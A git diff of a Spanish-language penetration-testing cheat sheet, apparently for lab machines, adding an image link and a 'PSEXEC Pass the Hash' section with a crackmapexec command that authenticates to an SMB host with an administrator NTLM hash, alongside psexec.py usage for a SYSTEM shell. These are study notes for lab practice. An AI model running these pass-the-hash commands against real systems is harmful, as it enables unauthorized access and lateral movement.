@@ -1451,6 +1451,9 @@ Para probar el hash de un usuario ( y mas si creeomos que es el Administrator)
 crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
 ```
 
+![image](https://github.com/gecr07/Acordeon/assets/63270579/62a75e78-4ef2-4778-997d-ce92b69333de)
+
+
 ## Pass the hash
 
 Si conseguimos el hash del administrador y el puerto 445 (al parecer esta abierto se puede hacer esto..
@@ -1475,6 +1478,12 @@ Igual permite regresar una shell con permisos de authority system. Pasos previos
 ```
 psexec.py WORKGROUP/s4vitar@10.10.14.22 cmd.exe
 Password:
+```
+## PSEXEC Pass the Hash
+Pero tambien se puede hacer pasando el hash
+
+```
+crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
 ```
 
 ## Windows exploit suggester Next generation
